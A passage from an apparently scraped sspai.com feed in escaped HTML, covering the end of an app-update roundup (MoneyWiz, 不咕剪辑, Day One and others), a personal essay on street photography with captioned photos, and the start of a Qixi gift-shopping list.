还提供了几个实用的快速操作：</p>\n<ul>\n<li>一键更换桌面；</li>\n<li>复制到剪贴板；</li>\n<li>下载高清图片；</li>\n<li>在 Unspalsh 中打开。</li>\n</ul>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/08/09/f7cc06e85b67aae106ba34c09eb336aa.gif\"></figure><p>除此之外，你还可以直接把图片拖拽到应用窗口中的目标位置，省去调整布局的繁琐操作。</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/editor/u_/c48f125b34tcditlgkig.gif\"></figure><p>你可以在 <a href=\"https://heycoaster.com/#\" target=\"_blank\">官网</a> 免费下载 Coaster，并在 Mac 或 Windows 设备上使用，但目前 Coaster 暂不支持移动设备。</p>\n<h2>值得关注的 App 更新</h2>\n<h3>MoneyWiz 2021：新的通知选项和视觉改善</h3>\n<p><a class=\"ss-atUser\" data-mention=\"@huhuhang\" user-id=\"bs2ovedb34tch278htb0\" href=\"https://sspai.com/u/huhuhang\">@huhuhang</a>：MoneyWiz 2021 作为一款面向偏专业用户的财务管理工具近期又推出了多个重要更新。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c48f12db34tcditlgkj0.png\"></figure><p>首先是 iOS 和 iPadOS 版本新增了 2 个小部件，分别小、中尺寸的预算余额，方便随时关注预算的变化情况。同时，菜单栏中新增了通知选项，方便更细致化地管理通知消息。如果添加了银行自动同步的帐户，MoneyWiz 支持对新交易进行通知，同时还可以在指定时间点提醒你不要忘记整理账目。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c48f12tb34tcdj3kork0.png\"></figure><p>如今，除了查看投资账户的全部佣金数据，还可以在账户统计信息卡中查看年度总佣金了。与此同时，MoneyWiz 改善了多处界面样式，包括帐户余额小部件的视觉改进，以及新的类别、帐户和预算图标。此外，表格模式下交易状态的形状和颜色也针对色盲人士进行了优化。</p>\n<p>有兴趣现在就可以到 <a href=\"https://apps.apple.com/cn/app/moneywiz-2021-%E4%B8%AA%E4%BA%BA%E8%B4%A2%E5%8A%A1/id1511185140\" target=\"_blank\">App Store</a> 和 <a href=\"https://apps.apple.com/cn/app/moneywiz-2021-%E4%B8%AA%E4%BA%BA%E8%B4%A2%E5%8A%A1/id1511185140\" target=\"_blank\">Mac App Store</a> 中下载试用 MoneyWiz 2021，新注册用户可以免费体验 7 天，同时可以按月度或者年度付费订阅。</p>\n<p>你可以在 少数派 <a href=\"https://sspai.com/item/64#345\" target=\"_blank\">购买 MoneyWiz 年订阅版本</a>，年订阅版本不仅赠送专属教程，还可以在 MonwyWiz 2021 上激活使用。</p>\n<span class=\"ss-genuineSoftware\" product-id=\"64\" type=\"genuineSoftware\"> </span><h3>不咕剪辑 1.6.5：加入专业时间线和关键帧功能</h3>\n<ul>\n<li>平台：iOS / iPadOS</li>\n<li>关键词：视频剪辑</li>\n</ul>\n<p><a class=\"ss-atUser\" data-mention=\"@Snow\" user-id=\"bs2od75b34tch2730o80\" href=\"https://sspai.com/u/ul0vcezb\">@Snow</a>：这段时间，擅长制作抠像视频的《<a href=\"https://sspai.com/post/63219\" target=\"_blank\">不咕剪辑</a>》孜孜不倦地更新了好几个版本，版本号变动虽不大，功能性却实打实向着专业方向演进了。</p>\n<p>首先，新版不咕在时间线功能上有了巨大的升级。在旧版中，当轨道层级增加时，主轨道外的内容就会被压缩成一条彩色细线，看起来虽然很简洁，但对于后续操作来说却并不直观。新版不咕会让所有视频素材都以缩略图形式展现，只有贴图和文字元素的时间线会被压缩。如果你想获得完整的时间线预览，点击时间线左上角的「展开」按钮，则可以让所有元素的预览都完整显示，剪辑时更为清晰。</p>\n<p>时间线一复杂，层级逻辑就成了头疼的事。大部分移动端剪辑应用并不支持展现层级的变更，只能通过复制相同图层实现，又或是输入层级编号来调整顺序，调整之前还得在脑子里算个数。不咕的操作直截了当，和桌面端一样，直接通过拖拽调节层级，而且支持主轨道操作，谁前谁后一拖了事。</p>\n<p>为了提高时间线的效率，应用将常用的剪辑、复制、删除功能独立在底部的剪辑快捷栏中，你只需选择轨道，移动标尺，就可以通过快捷按钮直接进行剪辑，而无需「选-剪-选-删」地多次操作，当你长按时间线区域左右拖拽时，应用还可以实现逐帧跳转，在这两个新功能的加持下，在移动端既高效又精准的剪辑也不是不可能实现嘛。</p> <p>说到「帧」的概念，新版应用中还加入了关键帧功能，你可以利用关键帧自定义更为复杂的动画效果，无论是轨迹运动、色彩变化还是蒙版效果，在关键帧的加持下都有了更大的自主权，可玩性也大幅提升。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/09/article/96cba2ca0b22eb2d1af769df4ea09eb9\"></figure><p>在不咕剪辑最擅长的「抠像」领域，它也玩出了新花样，他不仅能自动抠出人物素材，还能更精细地抠出「头像」元素。你可以利用这一功能尝试惊悚的人头气球、搞怪的大头特效、魔性的换头视频等等，伊藤润二都直呼内行。</p>\n<p>你可以在 <a href=\"https://apps.apple.com/cn/app/%E4%B8%8D%E5%92%95%E5%89%AA%E8%BE%91-%E6%97%A0%E5%B9%BF%E5%91%8A-%E8%BD%BB%E6%9D%BE%E5%89%AA/id1528288216\" target=\"_blank\">App Store</a> 免费下载《不咕剪辑》。</p>\n<span class=\"ss-application\" app-id=\"15780\"> </span><h2>App 速报</h2>\n<ul>\n<li>Day One（<a href=\"https://help.dayoneapp.com/en/articles/5403308-conceal-content-for-additional-privacy\" target=\"_blank\">iOS | macOS</a>）：更新至 v6.7，加入一项新功能：隐藏日记，通过按钮可以快速将应用上呈现的内容隐藏起来，从而避免在公共场所时被人偷窥到相关的内容。</li>\n<li>Ulysses（<a href=\"https://apps.apple.com/cn/app/ulysses/id1225571038?ign-mpt=uo=4\" target=\"_blank\">iOS | macOS</a>）：更新至 v23，针对博主带来诸多新特性，在文稿列表中，已发布的帖子会带有一个小的纸飞机图标，方便进行查看；操作面板中新增的小组将将显示帖子的发布状态、选择的博客平台以及上传日期；Ghost 用户现在可以更新之前发布的帖子。上传到 WordPress、Ghost、Micro.blog 和 Medium 等平台的帖子的发布状态现在可以在您的所有设备上同步，同时调整了群组写作目标的会话历史。</li>\n<li>CrossOver（<a href=\"https://www.codeweavers.com/crossover\" target=\"_blank\">macOS | Linux | Chrome OS</a>）：更新至 v21，基于 Wine 6.0，包含用于 Direct3D、DirectShow 和 Media Foundation 的新的 Vulkan 后端，针对 Mac 还有诸多改进，例如现在支持深色模式，Xbox Series X 和 PS5 的控制器现在可以通过蓝牙在 macOS BIg Sur 11.3 上使用.</li>\n<li>Affinity（<a href=\"https://affinity.serif.com/zh-cn/latest-update/?utm_medium=email&amp;utm_source=serifemail&amp;utm_campaign=1-10_Launch_Campaign_202108&amp;mc=110LaunchECE01\" target=\"_blank\">macOS | Windows | iPad</a>）：全部套件更新至 v1.10，Affinity Publisher 在本次更新中优化了内存管理、IDML 导入的速度提升了多达四倍；Affinity Photo 中图层混合的方式进行了调整，即便高度复杂的作品也能保证无损工作流；Affinity Designer 的渲染引擎优化速度是以往的数十倍。</li>\n</ul>\n<p>&gt; 下载 <a href=\"https://sspai.com/page/client\" target=\"_blank\">少数派 2.0 客户端</a>、关注 <a href=\"https://sspai.com/s/J71e\" target=\"_blank\">少数派公众号</a>，解锁全新阅读体验 📰</p>\n<p>&gt; 实用、好用的 <a href=\"https://sspai.com/mall\" target=\"_blank\">正版软件</a>，少数派为你呈现 🚀</p>\n<p> </p>\n<p>© 本文著作权归作者所有，并授权少数派独家使用，未经少数派许可，不得转载使用。</p>\n","link":"https://sspai.com/post/68188"},{"title":"在街头摄影，也在街头做一个讲故事的人","date":"2021-08-09 08:05:31","description":"\n<p>今年年初的时候，为了构思一篇公众演讲，破天荒的有机会回忆起了一些陈年老故事。演讲拟定的主题是【Unlock the hidden menu in life】，里面用这个主题串联了几个以前发生在我身上很美妙的事（至少我是这么认为），其中一个就是我是怎么走上摄影这条<s>不归</s>路的。</p>\n<p>今年疫情期间有大把的时间在家里，我完成了纽约摄影学院职业摄影师的在线课程，一方面是想要系统的了解摄影，另外一方面为了敦促自己能够对于摄影有更深刻的思考。在课程的最后单元，介绍了不同风格的摄影：婚礼、街头、自然风光、人像、商业等等。最重要是要找到自己心之所向的摄影方式，能够养活自己是一方面，如果只是所谓爱好的话，能够让自己快乐是终极原则。所幸，我的快乐在于观察人类，街头摄影占据了我大概 60% 的快门数量。</p>\n<p>虽然不是专业摄影师，但是对于街头摄影这件事，我也想谈谈我的一些经验与看法，也欢迎大家来探讨和指正。</p>\n<h2>如果要等，不妨等久一点</h2>\n<p>也许大家看过很多街头摄影的 vlog，能够看到摄影师总是穿梭在街道上，快速的按着快门捕捉着看到的一切，这当然很大程度上取决于摄影师的经验。要知道，还有一类摄影师，例如 Vincent Laforet，一旦找到了一个满意的场景，会在那里蹲几个小时，等待合适的人/物进入取景器的视野。这样的拍摄方式，就好像摄影师大胆的给这个世界出了一道填空题，然后等待世界给他安排一个正确的答案。诚然，不是所有的题都会得到一个满意的答案，但是，一旦拥有了正确答案的摄影师，其本身获得的满足一定是超乎寻常的，大约属于「延迟满足」的感觉。而在这样的场景下，等久一点，得到正确答案的几率就大一些。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/20/0587974f7eeed1cfaa27a0437f720eb4.jpg\"><figcaption>小女孩与打烊的冰淇淋车</figcaption></figure><p>这张照片就是我在晚上十点多钟蹲守在冰淇淋车对面拍到的画面。首先，这至少是一辆很好看的冰淇淋车，复古的造型，全景大玻璃窗，淡黄色车身。其次，它引发了我的思考，究竟什么样的人会适合在这辆车前面经过呢？而这期间，陆陆续续的从这辆车前面走过了很多的人，在我低头看向取景器的一霎那，发现了这个抱着毛绒玩具的小女孩，就果断按下了快门。小女孩看向打烊的冰淇淋车的眼神，虽然在照片里看不到，但已经写在了整个场景里。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/20/9a852c3a26e00530fd867ec10bd1d97a.jpg\"><figcaption>美术班请上二楼</figcaption></figure><p>这张照片里的路牌可能已经暴露了这张照片是在哪里拍的，是我在庙前喝完酒之后出来溜弯路过的一个门。当时觉得这个铁门设计的非常有趣，被刷成了蒙德里安的画的样子，整体的风格和美术培训室这个设置非常搭。显然我不是唯一一个觉得这个铁门有趣的人，不信你看照片里的三位。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/27/5507cb36c69a1c38f7783659051689c5.jpg\"><figcaption>Encounter</figcaption></figure><p>这张照片拍摄于青海湖。当时看到了从湖边骑马过来的人，觉得和景色还蛮搭，但是有有些单调，然后回头一看，有个旅客刚下车往湖边走，我就耐心的等他们两个相遇的时候按下了快门。照片拍出来会给人一种想象空间，会让人好奇，这位姑娘也许会和骑马人进行一段有趣的对话。比如：</p>\n<blockquote>\n<p>姑娘：前面就是青海湖嘛？</p>\n<p>骑马人：不然呢？</p>\n</blockquote>\n<p>再比如：</p>\n<blockquote>\n<p>骑马人：骑马拍照 50 一张</p>\n<p>姑娘：便宜点</p>\n</blockquote>\n<h2>照片里的温度</h2>\n<blockquote><p>如果摄影是你表达自我的途径，那么构图就是用于清晰地（确切的说，是流畅地）表达自我的交通工具。构图是把观看者带入照片的途径，使他们保持足够持久的注意力，以读懂你的表述内容，并明确自己的感受。</p></blockquote>\n<p>构图一直以来是各种摄影教程里强调的最重要的内容，这件事情本身并没有错，然而在我看来，构图的结构化被过分的强调了。固然，结构化构图对于摄影初学者来说，能快速的提高成片质量。但是，当拍了一定数量的照片之后，渐渐构图就变成了像语言一样自然而然用于照片表达的一种形式。在这种时候，能够符合你阐述主题的构图可能并不能被结构化的构图套路所解释。</p>\n<p>光影，对于街头摄影的表达来说也是非常重要的。光的温度、角度以及折射在物体的各种形状，本身就是摄影的最大乐趣之一。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/27/90870dced34a154c52ac603d55153764.jpg\"><figcaption>夕阳下的情侣</figcaption></figure><p>这张照片拍摄于德国科隆的夏天，是我非常喜欢的一张照片。当时的我本来在蹲点拍着科隆大教堂的日落时分，正好看到这对情侣坐在台子上喝酒聊天觉得他们的背影非常适合作为前景放入照片中。夕阳的光把两个人的轮廓勾勒了出来，身后的酒瓶和缝隙中的莱茵河以及河对岸的教堂都成为了服务于这个场景的一部分，传达出了一种非常惬意的感觉。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/27/d9c675f539aa34caa7783f149eb06705.jpg\"><figcaption>逆光骑士</figcaption></figure><p>其实我对夕阳是由一些情有独钟的，也许是因为光线的温暖的颜色，也许是因为光线的柔和。我喜欢世间万物被打上一层金光的样子，在我看来这并不是一天即将结束的最后荣光，而是让我能够对明天更有期待的一个预告片。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/27/a010e1ebd9c8ad7fb1f5abcae22d1f1b.jpg\"><figcaption>冷暖对比中的忙碌</figcaption></figure><p>这张照片背后其实有一个故事。当时我和朋友在这家店吃肠粉，旁边一个老阿姨看到我背着相机，就拍了拍我的肩膀跟我说：小伙子你跟我来。把我带到了能够看到后厨的这个位置，开始不厌其烦又絮絮叨叨的给我讲怎么调整参数来拍出肠粉刚蒸出来时候的锅气，还用她手里的机器来给我示范。我耐心的听她讲，心想这个老阿姨可真可爱啊。老阿姨走后，我尝试着站在她的角度，只不过我没有把重点放在锅气上面，而是拍下了冷暖对比的场景。</p>\n<h2>决定性瞬间</h2>\n<blockquote>\n<p>摄影与绘画不同，拍摄的那一秒是个充满创造力的瞬间，你所构建和表达的是生活本身所提供给你的，并且你必须凭直觉判断何时按下快门。按下快门的那一瞬，便是摄影师所创作的，哦......是的，就是那一瞬！一旦你错过，它将不复存在。</p>\n<p>                                                                                                                     - 布列松</p>\n</blockquote>\n<p>我一直认为街头摄影的魅力在于它的纪实性。拍出来的不是经过精心布光细心搭建的场景，而是街头那匆忙地、不可复制地、值得铭记的一瞬。另外一位摄影师也说过，最好的相机就是你带在身上那一台，这也在一定程度上佐证了这一观点。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/27/26bc34309a3c671d7984609c11ec6693.jpg\"><figcaption>Jump</figcaption></figure><p>广场上一群孩子们正在玩儿肥皂泡。处在当时当下的我，其实非常享受在那个场景里，我坐在广场的地上，晒着太阳，时不时的拿起相机拍一拍跑来跑去的孩子们，这张照片就诞生了，小男孩触碰到肥皂泡的一瞬。这样的瞬间，如果没有影像记录的话，是很难在脑海中构建出如此具象的画面的。小男孩跳起来的时候，左手用力的张着，仿佛要摆脱地心引力，右手竭力的打破那个巨大的泡泡，而泡泡本身破碎的一瞬，也是肉眼难以记录的。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/31/6e7323abff2c8dcf58722cc823e94140.jpg\"><figcaption>玩儿泡泡什么的最快乐了</figcaption></figure><p>和上面一张同一时段拍下的还有这一张，这张照片更多的是传达一种快乐的情绪。我们镜头中其实是很难捕捉到「情绪」这个略显虚无缥缈的词的。历史上也有很多著名的照片，比如「愤怒的丘吉尔 (The Roaring Lion)」表达的是愤怒。情绪通常在毫无防备下或者是无法掩饰的情况下才能被捕捉到，而随着年岁长大，我们掩饰情绪的能力也越来越高超，所以，能够捕捉到这样的场景真的是一件非常棒的一件事。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/27/12052e920e37e07b2aee7ceb31c1b7cf.jpg\"><figcaption>Kiss</figcaption></figure><p>情侣接吻似乎是街头摄影永恒的主题，尤其是在 Alfred Eisenstaedt「胜利之吻」之后。这张照片和那样的场景比起来，历史意味少了一些，但这丝毫不影响「接吻」这一主题传达出来的亲密与喜悦的情感。而有趣的是，这对情侣在自拍两人接吻，而我在拍他们自拍他们两个人接吻，颇有一种「你站在桥上看风景，而看风景的人在楼上看你」的意味。</p>\n<h2>直面陌生人的心理建设</h2>\n<p>街头摄影里面经常会被人提到的一个词就是「入侵」。相机背后的我们在通过镜头去记录世界的同时，被摄者常常会有一种被侵犯的感觉，尤其是你手中的相机不是那么 subtle 的时候。其实换位思考来看，如果我是被摄者，那么就很容易去理解这种入侵性了。</p>\n<p>通常应对这种情况，有两种方案。其一，让你的街拍设备尽量不显山不露水，越小的相机给人感觉上的入侵性越小。其二，把被摄者在感受到入侵性的瞬间作为你作品的一部分。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/27/bf696ccb595e5450029b4f3cbfa42943.jpg\"><figcaption>让我再看你一眼</figcaption></figure><p>这张照片拍摄于巴塞罗那的街头，我当时坐在长椅上休息，看着广场上的人，这个外卖小哥路过的时候我拍下了这张照片，小哥看到了我在拍他，我也看到了他看到了我在拍他，我已经做好了准备和小哥进行一番灵魂交流，不过小哥也并没有说什么。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/27/f91799d3c03b9540a8f23ce79b4cea15.jpg\"><figcaption>你大爷还是你大爷</figcaption></figure><p>这张拍摄于慕尼黑的街边咖啡馆。当时正在找吃饭的地方，路过这个大爷，觉得大爷十分酷直接举起相机拍了一张。拍完之后，和大爷打个友好的招呼。通常这种情况，如果碰到比较健谈的人，会直接引出一段友好的聊天。那么，问题的关键似乎就在于，你敢不敢举起相机按下快门踏出第一步。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/28/2ef2809d38184879b6896cef3a436549.jpg\"><figcaption>人类还是很可爱的啊</figcaption></figure><p>在机场等飞机时，拍摄传送带上路过的形色匆匆的行人。你根本想象不到发现我在拍照之后有多少人在传送带上给我摆各种各样的奇怪的 pose。所以人类还是很可爱的啊，我想这张照片告诉我的，不要害怕陌生人，去相信他们。</p>\n<h2>做一个讲故事的人</h2>\n<p>关于「讲故事」这件事，我想把它分为两部分。一类是人文，一类是城市。关于照片中的故事，其实有点像语文考试中的阅读理解，大概所有艺术相关的品类都有一样的内核。关键在于观者怎么用自己的经历阅历去解释这张照片，同时能从照片中感受到什么。</p>\n<h3>人类很可爱</h3>\n<p>接上文中提到的「人类很可爱」这个事情继续往下说。如果你的观察力足够敏锐，你可以看到一些很有趣的场景。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/27/6eb05331bf84153b6795e1d2d49a1dc5.jpg\"><figcaption>地铁站趣事</figcaption></figure><p>这张照片拍摄于慕尼黑的地铁站。如果是让我为这张照片写一个故事的话，可能是这样的：</p>\n<blockquote><p>请叫我埃德加，这并不是我的真名。我今年还不到70岁，我的女儿就已经开始处处紧张我的一举一动了。我只不过是想看看，十年前我掉在特蕾西亚地铁站台的眼镜是否还在那里。</p></blockquote>\n<p>我把照片发到朋友圈，评论区的画风是这样的：</p>\n<blockquote><p>我叫埃德加，是个侦探小说作家，多年伏案严重损害了我的视力，当我低头查看掉在轨道缝隙里的病历卡，女友突然伸出年轻而柔嫩的手，将我推向了无尽的黑暗……</p></blockquote>\n<p>还有这样的：</p>\n<blockquote><p>对，你没看错，图上戴着线帽的就是十年前天真烂漫的我 - 安吉拉，当时年幼的我没想到会成为一起惨案的亲历者，更没想到多年后会在朋友圈再次被迫重温这一噩梦……</p></blockquote>\n<p>这就充分说明了照片只是人心中所想的投射，另外，我似乎应该好好反思一下我的朋友圈了。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/28/5688ab5302f17171441a2e06c7dad516.jpg\"><figcaption>秀恩爱秀的我头秃</figcaption></figure><p>这张照片是一个阳光明媚的下午，即使是这样，有的人满脸笑意，也有的人苦大仇深。照片中画面中央的情侣给人一种非常阳光明媚的感觉，而与之形成鲜明对比的是后面的光头大哥，捂着头，似乎被狗粮晃到了眼睛。当然事实是完全相反的也不是没有可能，而且，正如前面所说的，这一切都在于观者看待这张照片的角度。</p>\n<h3>城市的风貌也被人类影响</h3>\n<p>相对于人文篇来说，城市篇可能会更多的表达城市和人之间的关系。人是怎么样去影响一座城市的风貌，以及一座城市的风貌怎么反应这个城市人民的气质。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/27/859bb8b05364e19c41ba38af5488a006.jpg\"><figcaption>好想吃</figcaption></figure><p>这张照片拍摄于广州。广州作为我心目中的美食之都，没有什么更能比美食能代表这座城市了。这是我在广州的第一个早上，在这家店吃完早茶出来，就看到门口这个大爷盯着橱窗里挂着的烧鹅目不转睛。照片中的主题是橱窗里的美食，而人物更是从一旁佐证了「看起来好好吃」这个事实。在广州的每一餐，吃的简直让人惊叹，作为一个北方人，而且是很北的北方人，竟然对这个城市的美食流连忘返。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/27/d5f4d73889690e7da97f65ca855a3980.jpg\"><figcaption>好闲适</figcaption></figure><p>美食之外，「闲适」也是我对这座城市的一个很深的感受。尤其是穿梭在老城的街巷里，仿佛看到了时间的停止，穿梭回了之前的时间。平时生活在北京，虽然在河边偶尔也可以看到钓鱼的大爷们，但是往往是装备齐全的不得了，仿佛一场军备竞赛，就没有广州这个钓鱼者来的闲适。仿佛像在告诉我，我就随便吊吊，鱼什么的无所谓的。传达出来的那种真正享受生活的感觉真是让我这个生活在快节奏城市里的人羡慕不已。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/28/b73d9a3044af6a2252ea3e392accb3fb.jpg\"><figcaption>西宁</figcaption></figure><p>西宁作为青海的首府，在一众省会城市中并不显眼。通常作为游客领略西北风光的中转站而存在。因为疫情的关系，清真大寺已经很久没有开门了，照片中的老人神情有些落寞。当然我们那次旅行在西宁也是作为中转的行程，整个城市给人一种非常平静的、甚至有些萧条的感觉，这和照片中呈现出的场景是一致的。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/28/99b1620d2f6d773aa8bcfa0f32c5de1a.jpg\"><figcaption>巴塞罗那</figcaption></figure><p>如果用一些词语来形容巴塞罗那的话，整体风格大概就是：阳光、沙滩、大海、音乐、热情。在巴塞罗那住了一周，适逢当地一个音乐节，在各个街巷都有不同风格的音乐趴，真是让人难以忘怀的一个夏天。照片是一个下午在海边吹海风的时候拍的，一群年轻人在打沙滩排球。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/28/ecbb637aed790b769e5033e4f540a18e.jpg\"><figcaption>罗马</figcaption></figure><p>如果说巴塞罗那能代表夏日的热情的话，那么罗马会更有一种文化上的厚重感。照片上是一组在写真的艺术系学生（我猜）。我觉得大部分人应该和我有相同的猜测，因为照片中的主体，这群学生，有的在抬头看向同一个地方，有的在本子上写划一些什么东西，还有一个在用笔似乎是在对比尺寸之类。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/28/6a779d1a434a64807e8ac8f2be55573a.jpg\"><figcaption>德国科隆</figcaption></figure><p>看到这里你一定会好奇，现在明明是城市篇为什么是一幅人像。之前说过，照片更多的是人思想的投射。在德国生活这么多年，我觉的这张照片最能代表我对德国的印象。照片拍摄于德国科隆的摄影器材展，照片中的主角，表情严肃冷漠，西装革履透露着专业度，胸口的铭牌说明了身份，这和我心目中德国的样子就是一样的。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/04/6109c40eee4497be3c09b55d7941979b.jpg\"><figcaption>北京</figcaption></figure><p>好多人问我为什么喜欢北京，我给出的答案就在这张照片里。北京最令我心向往之的就是他的融合性，有着胡同这样的传统街道，也有着国贸那些钢筋丛林。文化上的北京也是，虽然本应该是一座冷漠且就事论事的国际大都市，但却处处充满着人情味。我想，是这个地方的人，给这座城市带来了不一样的风情。高楼大厦可以复制，胡同小巷可以重建，可是一个城市人民的风情，是无法被复制的，也是一座城市的魅力所在。</p>\n<h2>一些不成熟的小思考</h2>\n<p>街头摄影这件事，说起来是一件既简单又复杂的事。简单的点在于，你只需要拿起相机按下快门；而复杂的点在于，你用快门捕捉到的这一刻想要传达出什么。</p>\n<p>对于街头摄影，上面我零零散散写了一些我认为对我自己来说比较重要的点，并以自己的照片作为例子。街头摄影不同于商业摄影，传达的更多的是一种原始的、未加修饰的情景和情绪，少了很多的精致感。也许这也是我喜欢街头摄影的原因吧。</p>\n","link":"https://sspai.com/post/66923"},{"title":"七夕将至，10+ 件生活好物送 TA 也能送自己","date":"2021-08-09 07:06:18","description":"\n<p>回想起上次商店打折，仿佛还在昨天，说起来商店也的确经常打折就是了。这不，我们又有了促销的全新理由：七夕（8 月 14 日）将要到来，不管你是有人陪还是独自一人，我们都挑选了一系列或适合送人 / 送己的商品，送别人一份精致礼品可以给 TA 惊喜，送自己一份好物也可以让生活充实快乐。</p>\n<p>⏰ <strong>活动时间：</strong>8.9 ~ 8.13</p>\n<h2>😮 送人给 TA 惊喜</h2>\n<h3>意外设计小时光便携钢笔・花信礼盒套装</h3>\n<p><a href=\"https://item.taobao.com/item.htm?id=652277527563\" target=\"_blank\">标准版</a> ¥295.2 起，<a href=\"https://item.taobao.com/item.htm?id=651536481128\" target=\"_blank\">花信礼盒版</a> ￥358.2 起</p>\n<p>@北鸮：与之前我在 <a href=\"https://sspai.com/post/67584\" target=\"_blank\">文章</a> 中推荐的大部分钢笔不同，意外设计本身并不是文具厂商，作为设计工作室，他们的钢笔也是从设计入手。我觉得这样的选择其实非常明智——在成本有限制的情况下，就应该把钱花在自己最擅长的地方，把优点尽可能放大。他们还为这款钢笔搭配了一个永生花花历礼盒，可以说，这是一款非常适合作为礼物的钢笔。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/29/072d6144ffac564b268484fb56435894.jpeg\"></figure><p>礼盒内除了钢笔本体与墨囊，还包括一张贺卡，以及一份带有永生花的台历式便签，便签本靠磁吸连接，写完可以替换或是换成其他装饰品。你可以把一些想说的话写在贺卡上，或是写在便签上，把它送给你爱的人，让黄铜与实木陪伴你们走过每一寸时光。</p>\n<p><strong>相关体验：</strong><a href=\"https://sspai.com/post/68006\" target=\"_blank\">新玩意 072 - 意外设计小时光便携钢笔・花信礼盒套装</a></p>\n<h3>COSTAR 天生一对·圆满项链</h3>\n<p>情侣款最低 ¥515 到手 <s>原价 ¥598 起</s>，月亮 / 太阳单件最低 ￥323 到手</p>\n<p>🛒<a href=\"https://item.taobao.com/item.htm?id=651757789077\" target=\"_blank\">点这买 &gt;</a></p>\n<p>@包包呀嘿：COSTAR 天生一对 · 圆满项链很符合我送礼物的思路。它选用了深海新西兰 4A 级鲍鱼贝，每一片都是独一无二、浑然天成的天然纹理。做成一对项链，一半是日，一半是月。拼在一起还是一个完整的圆，象征着圆满。日月的搭配，正如这对项链的名字一样，天生一对。日月长久，时光永在。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c45p4e5b34t8oic3r48g.jpeg?imageView2/2/w/1120/q/90/interlace/1/ignore-error/1\"></figure><p>天然贝壳的纹理，确实有一种神秘和迷人的感觉，梦幻的极光色，从碧绿到宝蓝，在光的加持下，反射出不同的色彩，美丽💅。极简的造型更能衬托出它的纯粹，也容易搭配。无论休闲的白 T 还是美丽的小裙子都能搭配在一起。</p>\n<p><strong>相关体验：</strong><a href=\"https://sspai.com/post/68115\" target=\"_blank\">新玩意 073 - COSTAR 天生一对·圆满项链</a></p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/05/2f5089ffef919b67c21e735a020937a1.jpg?imageView2/2/w/1120/q/90/interlace/1/ignore-error/1\"></figure><h3>七夕定制积木方仔</h3>\n<p>单人套餐 ￥299，双人套餐 ￥520</p>\n<p>🛒 <a href=\"http://brickme-studio.mikecrm.com/7B3w4cI\" target=\"_blank\">点这买 &gt;</a></p>\n<p>无论是哪个品牌的积木，方头仔系列都相当畅销。通过简单的拼搭就能组出一个可爱的小人偶。不过这些方头仔往往都有固定的拼搭步骤，想要个性化自定义又比较困难，方仔私人定制积木人偶让你可以定制属于自己的人偶。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/08/d1b480bd737386c240ec1739859d0dc3.png\"></figure><p>七夕快要到了，无论你是想送自己还是另一半，他们提供了单人 / 双人套装相框定制服务，只需要一张照片，就能把自己和另一半的形象做成独一无二的积木人偶，表达你别样的巧思。</p>\n<p>PS. 少数派颁发给年度作者的特别礼物也是通过他们定制了类似的一套~</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/08/08/3d526a63dd396985317f01da13961b74.gif\"></figure><h3>明基 ScreenBar Plus 屏幕挂灯航海王联名限定款</h3>\n<p>￥999</p>\n<p>🛒<a href=\"https://shop11352888.m.youzan.com/wscgoods/detail/2oix4pdb40kwg?step=1\" target=\"_blank\">点这买 &gt;</a>（注：为预售产品，9 月 2 日发货）</p>\n<p>明基 ScreenBar Plus 挂灯，现以海贼王联名款呈现！除了保留 ScreenBar Plus 优异的特性之外，定制版采用了金色灯体，上面「行驶」着迷你版的梅利号，调光旋钮也有航海主题的船舵设计。此外也额外附送了航海王贴纸、屏幕清洁布、通缉令月历等。该款全球限量 2000 台，喜欢的朋友可能要抓紧。</p>\n<p>ScreenBar Plus 特殊的非对称光学设计，可以实现有效控制光路，屏幕不反光，并且将台灯控制器独立成了可移动的控制旋钮，在人机交互和光源检测上都有很好的使用体验与效果。</p>\n<figure class=\"image ss-img-wrapper\"><img 